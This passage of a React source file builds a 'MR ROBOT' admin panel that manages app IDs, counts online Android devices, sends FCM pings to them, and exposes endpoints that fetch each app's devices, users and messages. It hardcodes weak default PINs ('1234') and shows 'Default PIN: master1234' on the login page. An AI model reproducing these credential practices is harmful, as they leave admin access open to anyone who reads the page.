import { useState, useEffect, useRef } from "react";
import { CircularLoader } from "@/components/ui/circular-loader";
import { CopyIconButton } from "@/components/ui/copy-icon-button";

interface App {
  id: number; appId: string; name: string; pin: string; status: string; createdAt: string;
}

const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP: App = {
  id: 1,
  appId: DEFAULT_APP_ID,
  name: "MR ROBOT",
  pin: "1234",
  status: "active",
  createdAt: new Date().toISOString(),
};

function ensureDefaultApp(apps: App[]): App[] {
  const exists = apps.some((app) => app.appId === DEFAULT_APP_ID);
  return exists ? apps : [DEFAULT_APP, ...apps];
}


function genAppId() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const seg = (n: number) => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  return `APP-${seg(4)}-${seg(4)}-${seg(4)}`;
}

function fmtDate(iso: string) {
  return new Date(iso).toLocaleString("en-IN", { day: "2-digit", month: "short", year: "numeric", hour: "2-digit", minute: "2-digit", hour12: true });
}

const VALIDITY_DAYS = 30;

function expiresAt(createdAt: string): Date {
  return new Date(new Date(createdAt).getTime() + VALIDITY_DAYS * 24 * 60 * 60 * 1000);
}

function daysLeft(createdAt: string): number {
  const ms = expiresAt(createdAt).getTime() - Date.now();
  return Math.ceil(ms / (24 * 60 * 60 * 1000));
}

function ValidityBadge({ createdAt }: { createdAt: string }) {
  const left = daysLeft(createdAt);
  if (left <= 0) {
    return <span style={{ background: "#450a0a", color: "#f87171", borderRadius: 99, padding: "2px 8px", fontSize: 10, fontWeight: 700 }}>EXPIRED</span>;
  }
  const bg = left <= 7 ? "#451a03" : "#14532d";
  const col = left <= 7 ? "#fb923c" : "#4ade80";
  return <span style={{ background: bg, color: col, borderRadius: 99, padding: "2px 8px", fontSize: 10, fontWeight: 700 }}>{left}d left</span>;
}

function getDashboardUrl(appId: string) {
  // Always build the sub-admin dashboard URL from the site origin.
  // This prevents live Cloudflare Pages URLs like /preview/preview/dashboard/...
  // or //preview/dashboard/... when the current page is already under /preview.
  return `${window.location.origin}/preview/dashboard/WebDashboard?appId=${encodeURIComponent(appId)}`;
}

function getApiBase() {
  return `${window.location.origin}/api`;
}

const IS = (extra?: React.CSSProperties): React.CSSProperties => ({
  width: "100%", padding: "10px 12px", borderRadius: 8,
  border: "1.5px solid #334155", background: "#1e293b",
  color: "#f1f5f9", fontSize: 13, outline: "none", boxSizing: "border-box",
  ...extra,
});
const LS: React.CSSProperties = {
  fontSize: 11, color: "#94a3b8", fontWeight: 600,
  textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 4, display: "block",
};

/* ── FCM helper ── */
async function fcmSend(fcmToken: string, deviceId: string, data: Record<string, string>): Promise<string> {
  const res = await fetch("/api/fcm/send", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ deviceId, fcmToken, data }),
  });
  const body = await res.json() as Record<string, unknown>;
  if (!res.ok) throw new Error(String((body["error"] as Record<string, unknown>)?.["message"] ?? body["error"] ?? "FCM failed"));
  return String(body["messageId"] ?? "sent");
}

function useInfiniteScroll<T>(items: T[], pageSize = 10) {
  const [count, setCount] = useState(pageSize);
  const [loading, setLoading] = useState(false);
  const sentinelRef = useRef<HTMLDivElement>(null);
  const itemsLen = useRef(items.length);
  itemsLen.current = items.length;
  useEffect(() => { setCount(pageSize); setLoading(false); }, [items.length, pageSize]);
  useEffect(() => {
    const el = sentinelRef.current;
    if (!el) return;
    const obs = new IntersectionObserver(entries => {
      if (entries[0].isIntersecting) {
        setLoading(true);
        requestAnimationFrame(() => {
          setCount(c => Math.min(c + pageSize, itemsLen.current));
          setLoading(false);
        });
      }
    }, { rootMargin: "300px" });
    obs.observe(el);
    return () => obs.disconnect();
  }, [pageSize]);
  return { visible: items.slice(0, count), sentinelRef, hasMore: count < items.length, loading };
}

function isRecent(lastOnline: string | null | undefined): boolean {
  if (!lastOnline) return false;
  const s = lastOnline.toLowerCase().trim();
  const secM = s.match(/^(\d+)\s*s\s*(ago)?/);
  if (secM) return true;
  const minM = s.match(/^(\d+)\s*m\s*(ago)?/);
  if (minM) return parseInt(minM[1]) <= 15;
  const dt = new Date(lastOnline);
  if (!isNaN(dt.getTime())) return Date.now() - dt.getTime() <= 15 * 60 * 1000;
  return false;
}

interface DeviceRow { deviceId: string; fcmToken: string | null; status: string; lastOnline: string | null; }

/* ── Per-card online stats + ping ── */
function AppCardStats({ appId }: { appId: string }) {
  const [devices, setDevices] = useState<DeviceRow[]>([]);
  const [pingState, setPingState] = useState<"idle"|"running"|"done">("idle");
  const [pingDone, setPingDone] = useState(0);
  const [pingResult, setPingResult] = useState<{ ok: number; fail: number } | null>(null);

  useEffect(() => {
    fetch(`/api/devices?appId=${encodeURIComponent(appId)}`)
      .then(r => r.ok ? r.json() : [])
      .then((d: DeviceRow[]) => setDevices(d))
      .catch(() => {});
  }, [appId]);

  const total = devices.length;
  const online = devices.filter(d => d.status !== "uninstalled" && isRecent(d.lastOnline)).length;

  async function handlePingAll() {
    if (pingState === "running" || total === 0) return;
    const BATCH = 2; const DELAY = 800;
    const updated_at = new Date().toISOString();
    setPingState("running"); setPingDone(0); setPingResult(null);
    let ok = 0; let fail = 0;
    for (let i = 0; i < devices.length; i += BATCH) {
      const batch = devices.slice(i, i + BATCH);
      const results = await Promise.allSettled(batch.map(d =>
        d.fcmToken
          ? fcmSend(d.fcmToken, d.deviceId, { type: "0", updated_at })
          : Promise.reject("no_token")
      ));
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setPingDone(Math.min(i + BATCH, devices.length));
      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
    }
    setPingResult({ ok, fail }); setPingState("done");
    setTimeout(() => { setPingState("idle"); setPingDone(0); setPingResult(null); }, 4000);
  }

  return (
    <div style={{ padding: "8px 14px", borderTop: "1px solid #1e293b", display: "flex", flexDirection: "column", gap: 8 }}>
      {/* Online count row */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <div style={{ width: 7, height: 7, borderRadius: "50%", background: online > 0 ? "#22c55e" : "#475569" }} />
            <span style={{ fontSize: 12, color: "#94a3b8", fontWeight: 600 }}>Online</span>
            <span style={{ fontSize: 13, fontWeight: 800, color: online > 0 ? "#22c55e" : "#475569" }}>{online}</span>
            <span style={{ fontSize: 11, color: "#334155" }}>/ {total}</span>
          </div>
        </div>
        {/* Ping progress inline */}
        {pingState === "running" && (
          <span style={{ fontSize: 10, color: "#6366f1", fontWeight: 700 }}>Pinging {pingDone}/{total}…</span>
        )}
        {pingResult && (
          <span style={{ fontSize: 10, fontWeight: 700, color: pingResult.fail === 0 ? "#22c55e" : "#f59e0b" }}>
            ✓ {pingResult.ok} sent {pingResult.fail > 0 ? `· ✗ ${pingResult.fail}` : ""}
          </span>
        )}
        {/* Ping All button */}
        <button
          onClick={() => void handlePingAll()}
          disabled={pingState === "running" || total === 0}
          style={{
            padding: "5px 12px", borderRadius: 7, border: "1px solid",
            borderColor: pingState === "done" ? "#22c55e" : pingState === "running" ? "#6366f1" : "#334155",
            background: pingState === "done" ? "#14532d" : pingState === "running" ? "#1e1b4b" : "#1e293b",
            color: pingState === "done" ? "#4ade80" : pingState === "running" ? "#818cf8" : "#94a3b8",
            fontWeight: 700, fontSize: 11,
            cursor: pingState === "running" || total === 0 ? "not-allowed" : "pointer",
            transition: "all 0.15s", whiteSpace: "nowrap" as const,
          }}
        >
          {pingState === "running" ? "…" : pingState === "done" ? "Done ✓" : `Ping All (${total})`}
        </button>
      </div>
      {/* Progress bar */}
      {pingState === "running" && (
        <div style={{ height: 3, background: "#1e293b", borderRadius: 2, overflow: "hidden" }}>
          <div style={{ height: "100%", background: "#6366f1", width: `${total > 0 ? Math.round((pingDone / total) * 100) : 0}%`, transition: "width 0.3s" }} />
        </div>
      )}
    </div>
  );
}

function CopyBtn({ value }: { value: string }) {
  return <CopyIconButton value={value} size={28} color="#6366f1" />;
}

/* ═══════════════════════
   MASTER LOGIN
═══════════════════════ */
function MasterLogin({ onAuth }: { onAuth: () => void }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [mode, setMode] = useState<"login" | "change">("login");
  const [oldPin, setOldPin] = useState("");
  const [newPin, setNewPin] = useState("");
  const [newPin2, setNewPin2] = useState("");
  const [msg, setMsg] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true); setErr("");
    try {
      const r = await fetch("/api/admin/verify-master-pin", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin }),
      });
      if (r.ok) {
        sessionStorage.setItem("mrrobot_master_auth", "1");
        onAuth();
      } else {
        setErr("Wrong Master PIN."); setPin("");
      }
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  async function handleChange(e: React.FormEvent) {
    e.preventDefault();
    if (newPin.length < 4) { setErr("Min 4 characters."); return; }
    if (newPin !== newPin2) { setErr("PINs do not match."); return; }
    setLoading(true); setErr("");
    try {
      const r = await fetch("/api/admin/master-pin", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPin: oldPin, newPin }),
      });
      if (r.ok) {
        setMsg("Master PIN changed!"); setMode("login");
        setOldPin(""); setNewPin(""); setNewPin2(""); setErr("");
      } else {
        const j = await r.json().catch(() => ({})) as { error?: string };
        setErr(j.error ?? "Error changing PIN.");
      }
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  return (
    <div style={{ minHeight: "100vh", background: "#050810", display: "flex", alignItems: "center", justifyContent: "center", padding: 16, fontFamily: "system-ui,sans-serif" }}>
      <div style={{ width: "100%", maxWidth: 380 }}>
        <div style={{ background: "#0f172a", borderRadius: 18, padding: "32px 28px", border: "1px solid #1e293b", boxShadow: "0 24px 60px #00000099" }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 18 }}>
            <div style={{ width: 56, height: 56, borderRadius: 16, background: "#1e293b", border: "2px solid #f59e0b", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <path d="M12 2L2 7l10 5 10-5-10-5z" stroke="#f59e0b" strokeWidth="1.5" strokeLinejoin="round"/>
                <path d="M2 17l10 5 10-5" stroke="#f59e0b" strokeWidth="1.5" strokeLinejoin="round"/>
                <path d="M2 12l10 5 10-5" stroke="#f59e0b" strokeWidth="1.5" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>
          <div style={{ textAlign: "center", marginBottom: 26 }}>
            <div style={{ color: "#fbbf24", fontWeight: 900, fontSize: 20, letterSpacing: 2 }}>MAIN ADMIN</div>
            <div style={{ color: "#475569", fontSize: 11, marginTop: 3 }}>MR ROBOT — Master Control Panel</div>
          </div>

          {mode === "login" ? (
            <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
              <div>
                <label style={LS}>Master PIN</label>
                <input type="password" value={pin} onChange={e => { setPin(e.target.value); setErr(""); }}
                  placeholder="Enter Master PIN" autoFocus style={IS()} />
              </div>
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              {msg && <div style={{ color: "#4ade80", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{msg}</div>}
              <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
                <button type="submit" disabled={loading} style={{ flex: 1, background: "#f59e0b", color: "#000", border: "none", borderRadius: 9, padding: 12, fontWeight: 800, fontSize: 13, cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.7 : 1 }}>
                  {loading ? "Verifying…" : "Enter Admin"}
                </button>
                <button type="button" disabled={loading} onClick={() => { setMode("change"); setErr(""); setMsg(""); }} style={{ flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155", borderRadius: 9, padding: 12, fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
                  Change PIN
                </button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleChange} style={{ display: "flex", flexDirection: "column", gap: 12 }}>
              {[["Current PIN", oldPin, setOldPin], ["New PIN", newPin, setNewPin], ["Confirm PIN", newPin2, setNewPin2]].map(([label, val, setFn]) => (
                <div key={label as string}>
                  <label style={LS}>{label as string}</label>
                  <input type="password" value={val as string} onChange={e => { (setFn as (v: string) => void)(e.target.value); setErr(""); }}
                    placeholder={label as string} style={IS()} />
                </div>
              ))}
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
                <button type="submit" disabled={loading} style={{ flex: 1, background: "#f59e0b", color: "#000", border: "none", borderRadius: 9, padding: 12, fontWeight: 800, fontSize: 13, cursor: loading ? "not-allowed" : "pointer", opacity: loading ? 0.7 : 1 }}>{loading ? "Saving…" : "Update"}</button>
                <button type="button" disabled={loading} onClick={() => { setMode("login"); setErr(""); }} style={{ flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155", borderRadius: 9, padding: 12, fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Cancel</button>
              </div>
            </form>
          )}
          <div style={{ textAlign: "center", marginTop: 20, color: "#334155", fontSize: 11 }}>Default PIN: master1234</div>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════
   RESET PIN DIALOG
═══════════════════════ */
function ResetPinDialog({ app, onClose, onSuccess }: { app: App; onClose: () => void; onSuccess: () => void }) {
  const [newPin, setNewPin] = useState("");
  const [confirmPin, setConfirmPin] = useState("");
  const [saving, setSaving] = useState(false);
  const [err, setErr] = useState("");

  async function handleSave(e: React.FormEvent) {
    e.preventDefault();
    if (!newPin.trim()) { setErr("Naya PIN required."); return; }
    if (newPin.length < 4) { setErr("PIN min 4 characters."); return; }
    if (newPin !== confirmPin) { setErr("Dono PIN match nahi kar rahe."); return; }
    setSaving(true); setErr("");
    try {
      const r = await fetch(`/api/apps/${app.appId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: newPin }),
      });
      if (!r.ok) { const j = await r.json().catch(() => ({})); setErr((j as { error?: string }).error ?? "Error"); return; }
      onSuccess();
    } catch { setErr("Network error."); }
    finally { setSaving(false); }
  }

  return (
    <div style={{ position: "fixed", inset: 0, background: "#000000aa", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 300, padding: 16 }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#0f172a", borderRadius: 16, padding: "24px 22px", width: "100%", maxWidth: 380, border: "1px solid #6366f1", boxShadow: "0 20px 60px #000" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 16 }}>
          <div>
            <div style={{ fontWeight: 800, fontSize: 16, color: "#f1f5f9" }}>Reset Admin PIN</div>
            <div style={{ fontSize: 11, color: "#64748b", marginTop: 2, fontFamily: "monospace" }}>{app.appId}</div>
          </div>
          <button onClick={onClose} style={{ background: "none", border: "none", color: "#64748b", fontSize: 20, cursor: "pointer", lineHeight: 1 }}>×</button>
        </div>
        <form onSubmit={handleSave} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          <div>
            <label style={LS}>New PIN</label>
            <input type="password" value={newPin} autoFocus onChange={e => { setNewPin(e.target.value); setErr(""); }} placeholder="Min 4 characters" style={IS()} />
          </div>
          <div>
            <label style={LS}>Confirm New PIN</label>
            <input type="password" value={confirmPin} onChange={e => { setConfirmPin(e.target.value); setErr(""); }} placeholder="Re-enter PIN" style={IS()} />
          </div>
          {err && <div style={{ color: "#f87171", fontSize: 12, fontWeight: 600 }}>{err}</div>}
          <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
            <button type="submit" disabled={saving} style={{ flex: 1, background: "#6366f1", color: "#fff", border: "none", borderRadius: 9, padding: 12, fontWeight: 800, fontSize: 13, cursor: "pointer", opacity: saving ? 0.6 : 1 }}>
              {saving ? "Saving…" : "Reset PIN"}
            </button>
            <button type="button" onClick={onClose} style={{ flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155", borderRadius: 9, padding: 12, fontWeight: 600, fontSize: 13, cursor: "pointer" }}>Cancel</button>
          </div>
        </form>
      </div>
    </div>
  );
}

/* ═══════════════════════
   APP INFO / ABOUT MODAL
═══════════════════════ */
function AppInfoModal({ app, onClose }: { app: App; onClose: () => void }) {
  const [showReset, setShowReset] = useState(false);
  const [resetOk, setResetOk] = useState(false);
  const loginUrl = getDashboardUrl(app.appId);
  const apiBase = getApiBase();

  const left = daysLeft(app.createdAt);
  const rows: { label: string; value: string; mono?: boolean; warn?: boolean }[] = [
    { label: "App Name", value: app.name },
    { label: "App ID", value: app.appId, mono: true },
    { label: "Status", value: app.status.toUpperCase(), warn: app.status !== "active" },
    { label: "Admin PIN", value: "••••••", mono: true },
    { label: "Created", value: fmtDate(app.createdAt) },
    { label: "Expires", value: fmtDate(expiresAt(app.createdAt).toISOString()), warn: left <= 0 },
    { label: "Validity", value: left <= 0 ? "EXPIRED" : `${left} day${left !== 1 ? "s" : ""} remaining`, warn: left <= 7 },
  ];

  const endpoints = [
    { method: "GET", path: `/api/devices?appId=${app.appId}`, desc: "Fetch all devices" },
    { method: "GET", path: `/api/users?appId=${app.appId}`, desc: "Fetch all users" },
    { method: "GET", path: `/api/messages?appId=${app.appId}`, desc: "Fetch all messages" },
    { method: "POST", path: `/api/messages`, desc: `Send message { appId: "${app.appId}", ... }` },
  ];

  return (
    <div style={{ position: "fixed", inset: 0, background: "#00000095", display: "flex", alignItems: "flex-end", justifyContent: "center", zIndex: 200, padding: "0" }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ background: "#0a1628", borderRadius: "20px 20px 0 0", width: "100%", maxWidth: 500, maxHeight: "90vh", overflowY: "auto", border: "1px solid #1e293b", boxShadow: "0 -20px 60px #000" }}>

        {/* Header */}
        <div style={{ padding: "16px 18px 0", display: "flex", alignItems: "center", justifyContent: "space-between", position: "sticky", top: 0, background: "#0a1628", zIndex: 1 }}>
          <div>
            <div style={{ fontWeight: 900, fontSize: 16, color: "#f1f5f9" }}>{app.name}</div>
            <div style={{ fontFamily: "monospace", fontSize: 10, color: "#6366f1", marginTop: 2 }}>{app.appId}</div>
          </div>
          <button onClick={onClose} style={{ background: "#1e293b", border: "none", color: "#94a3b8", width: 30, height: 30, borderRadius: 8, fontSize: 16, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>×</button>
        </div>

        <div style={{ padding: "14px 18px 28px", display: "flex", flexDirection: "column", gap: 16 }}>

          {/* App Details */}
          <div style={{ background: "#0f172a", borderRadius: 12, border: "1px solid #1e293b", overflow: "hidden" }}>
            <div style={{ padding: "8px 14px", background: "#1e293b44", fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>App Details</div>
            {rows.map(({ label, value, mono, warn }) => {
              const isPinRow = label === "Admin PIN";
              return (
                <div key={label} style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: "1px solid #1a2540", gap: 8 }}>
                  <span style={{ width: 80, fontSize: 11, color: "#475569", fontWeight: 600, flexShrink: 0 }}>{label}</span>
                  <span style={{ flex: 1, fontFamily: mono ? "monospace" : undefined, fontSize: 12, color: warn ? "#f87171" : mono ? "#a5b4fc" : "#e2e8f0", wordBreak: "break-all" }}>{value}</span>
                  {isPinRow ? (
                    <button onClick={() => { setShowReset(true); setResetOk(false); }}
                      style={{ background: "#6366f1", color: "#fff", border: "none", borderRadius: 6, padding: "5px 10px", fontSize: 11, fontWeight: 700, cursor: "pointer", whiteSpace: "nowrap" }}>
                      Reset PIN
                    </button>
                  ) : mono && <CopyBtn value={value} />}
                </div>
              );
            })}
            {resetOk && (
              <div style={{ padding: "8px 14px", background: "#14532d33", color: "#4ade80", fontSize: 11, fontWeight: 700, textAlign: "center" }}>
                ✓ PIN reset successfully (saved as hash)
              </div>
            )}
          </div>

          {showReset && (
            <ResetPinDialog
              app={app}
              onClose={() => setShowReset(false)}
              onSuccess={() => { setShowReset(false); setResetOk(true); }}
            />
          )}

          {/* Login URL */}
          <div style={{ background: "#0f172a", borderRadius: 12, border: "1px solid #1e293b", overflow: "hidden" }}>
            <div style={{ padding: "8px 14px", background: "#1e293b44", fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>Sub-Admin Login URL</div>
            <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 8 }}>
              <div style={{ display: "flex", alignItems: "flex-start", gap: 8 }}>
                <div style={{ flex: 1, fontFamily: "monospace", fontSize: 11, color: "#6366f1", background: "#0d1a33", padding: "8px 10px", borderRadius: 8, wordBreak: "break-all", lineHeight: 1.5 }}>{loginUrl}</div>
                <CopyBtn value={loginUrl} />
              </div>
              <div style={{ fontSize: 11, color: "#475569" }}>Share this URL with the sub-admin. PIN: <span style={{ fontFamily: "monospace", color: "#fbbf24" }}>••••••</span> <span style={{ color: "#64748b" }}>(hidden — use Reset PIN to set a new one)</span></div>
            </div>
          </div>

          {/* Android Integration */}
          <div style={{ background: "#0f172a", borderRadius: 12, border: "1px solid #1e293b", overflow: "hidden" }}>
            <div style={{ padding: "8px 14px", background: "#1e293b44", fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>Android Integration</div>
            <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 10 }}>
              <div style={{ fontSize: 12, color: "#94a3b8", lineHeight: 1.6 }}>
                Use the same <span style={{ color: "#fbbf24", fontFamily: "monospace" }}>App ID</span> in your Android app to link data to this dashboard. All devices, users, and messages must include this App ID.
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.5 }}>API Base URL</div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <div style={{ flex: 1, fontFamily: "monospace", fontSize: 11, color: "#34d399", background: "#0d1a33", padding: "7px 10px", borderRadius: 7, wordBreak: "break-all" }}>{apiBase}</div>
                  <CopyBtn value={apiBase} />
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.5 }}>App ID (use in Android)</div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <div style={{ flex: 1, fontFamily: "monospace", fontSize: 12, color: "#fbbf24", background: "#0d1a33", padding: "7px 10px", borderRadius: 7 }}>{app.appId}</div>
                  <CopyBtn value={app.appId} />
                </div>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.5 }}>API Endpoints</div>
                {endpoints.map(ep => (
                  <div key={ep.path} style={{ background: "#0d1a33", borderRadius: 8, padding: "8px 10px" }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 3 }}>
                      <span style={{ background: ep.method === "POST" ? "#78350f" : "#1e3a5f", color: ep.method === "POST" ? "#fbbf24" : "#60a5fa", borderRadius: 4, padding: "1px 6px", fontSize: 10, fontWeight: 800 }}>{ep.method}</span>
                      <span style={{ fontFamily: "monospace", fontSize: 10, color: "#94a3b8", wordBreak: "break-all" }}>{ep.path}</span>
                    </div>
                    <div style={{ fontSize: 10, color: "#475569" }}>{ep.desc}</div>
                  </div>
                ))}
              </div>

              <div style={{ background: "#1a1000", border: "1px solid #78350f", borderRadius: 8, padding: "10px 12px" }}>
                <div style={{ fontSize: 11, fontWeight: 700, color: "#fbbf24", marginBottom: 4 }}>Android Header Required</div>
                <div style={{ fontFamily: "monospace", fontSize: 11, color: "#94a3b8", lineHeight: 1.7 }}>
                  {"X-App-Id: "}<span style={{ color: "#fbbf24" }}>{app.appId}</span><br/>
                  {"Content-Type: application/json"}
                </div>
                <CopyBtn value={`X-App-Id: ${app.appId}`} />
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════
   CREATE SUCCESS SCREEN
═══════════════════════ */
function CreatedSuccess({ app, onClose }: { app: App; onClose: () => void }) {
  const loginUrl = getDashboardUrl(app.appId);
  return (
    <div style={{ position: "fixed", inset: 0, background: "#00000095", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 200, padding: 16 }}>
      <div style={{ background: "#0a1628", borderRadius: 18, padding: "28px 22px", width: "100%", maxWidth: 420, border: "1px solid #166534", boxShadow: "0 24px 60px #000" }}>

        <div style={{ textAlign: "center", marginBottom: 20 }}>
          <div style={{ width: 52, height: 52, borderRadius: 14, background: "#14532d", border: "2px solid #4ade80", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 12px" }}>
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
              <path d="M5 13l4 4L19 7" stroke="#4ade80" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          <div style={{ fontWeight: 900, fontSize: 18, color: "#4ade80" }}>App Created!</div>
          <div style={{ color: "#64748b", fontSize: 12, marginTop: 4 }}>{app.name}</div>
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>

          <div style={{ background: "#0f172a", borderRadius: 10, padding: "12px 14px", border: "1px solid #1e293b" }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 8 }}>App ID (for Android)</div>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <div style={{ flex: 1, fontFamily: "monospace", fontSize: 13, color: "#fbbf24", background: "#1e293b", padding: "7px 10px", borderRadius: 7 }}>{app.appId}</div>
              <CopyBtn value={app.appId} />
            </div>
          </div>

          <div style={{ background: "#0f172a", borderRadius: 10, padding: "12px 14px", border: "1px solid #1e293b" }}>
            <div style={{ fontSize: 11, fontWeight: 700, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 8 }}>Sub-Admin Login URL</div>
            <div style={{ display: "flex", alignItems: "flex-start", gap: 8 }}>
              <div style={{ flex: 1, fontFamily: "monospace", fontSize: 11, color: "#6366f1", background: "#1e293b", padding: "7px 10px", borderRadius: 7, wordBreak: "break-all", lineHeight: 1.5 }}>{loginUrl}</div>
              <CopyBtn value={loginUrl} />
            </div>
            <div style={{ fontSize: 11, color: "#475569", marginTop: 6 }}>PIN: <span style={{ fontFamily: "monospace", color: "#fbbf24" }}>••••••</span> <span style={{ color: "#64748b" }}>(hidden for security)</span></div>
          </div>

          <button onClick={onClose} style={{ background: "#f59e0b", color: "#000", border: "none", borderRadius: 10, padding: 13, fontWeight: 800, fontSize: 13, cursor: "pointer", marginTop: 4 }}>
            Done
          </button>
        </div>
      </div>
    </div>
  );
}

/* ═══════════════════════
   CREATE / EDIT MODAL
═══════════════════════ */
function AppModal({ app, onClose, onCreated }: {
  app: App | null;
  onClose: () => void;
  onCreated: (created: App) => void;
}) {
  const [appId, setAppId] = useState(app?.appId ?? genAppId());
  const name = "MR ROBOT";
  const isEdit = !!app;
  const [pin, setPin] = useState(isEdit ? "" : "1234");
  const [status, setStatus] = useState(app?.status ?? "active");
  const [saving, setSaving] = useState(false);
  const [err, setErr] = useState("");

  async function handleSave(e: React.FormEvent) {
    e.preventDefault();
    if (!appId.trim()) { setErr("App ID required."); return; }
    if (!isEdit && !pin.trim()) { setErr("PIN required."); return; }
    if (pin.trim() && pin.length < 4) { setErr("PIN min 4 characters."); return; }
    setSaving(true); setErr("");
    try {
      const url = isEdit ? `/api/apps/${app!.appId}` : "/api/apps";
      const method = isEdit ? "PATCH" : "POST";
      const body: Record<string, string> = isEdit ? { name, status } : { appId, name, pin, status };
      if (isEdit && pin.trim()) body.pin = pin;
      const r = await fetch(url, { method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
      if (!r.ok) { const j = await r.json().catch(() => ({})); setErr((j as { error?: string }).error ?? "Error"); return; }
      const saved = await r.json() as App;
      onCreated(saved);
    } catch { setErr("Network error."); }
    finally { setSaving(false); }
  }

  return (
    <div style={{ position: "fixed", inset: 0, background: "#00000090", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16 }}>
      <div style={{ background: "#0f172a", borderRadius: 16, padding: "24px 22px", width: "100%", maxWidth: 400, border: "1px solid #1e293b", boxShadow: "0 20px 60px #000" }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 20 }}>
          <div style={{ fontWeight: 800, fontSize: 16, color: "#f1f5f9" }}>{isEdit ? "Edit App" : "Create New App"}</div>
          <button onClick={onClose} style={{ background: "none", border: "none", color: "#64748b", fontSize: 20, cursor: "pointer", lineHeight: 1 }}>×</button>
        </div>
        <form onSubmit={handleSave} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
          <div>
            <label style={LS}>App ID</label>
            <div style={{ display: "flex", gap: 6 }}>
              <input value={appId} onChange={e => { setAppId(e.target.value.toUpperCase()); setErr(""); }}
                readOnly={isEdit} placeholder="APP-XXXX-XXXX-XXXX"
                style={IS({ flex: 1, fontFamily: "monospace", color: "#6366f1", cursor: isEdit ? "default" : undefined })} />
              {!isEdit && (
                <button type="button" onClick={() => setAppId(genAppId())} style={{ background: "#1e293b", color: "#94a3b8", border: "1px solid #334155", borderRadius: 8, padding: "0 10px", cursor: "pointer", fontSize: 12, whiteSpace: "nowrap" }}>
                  Gen
                </button>
              )}
            </div>
          </div>
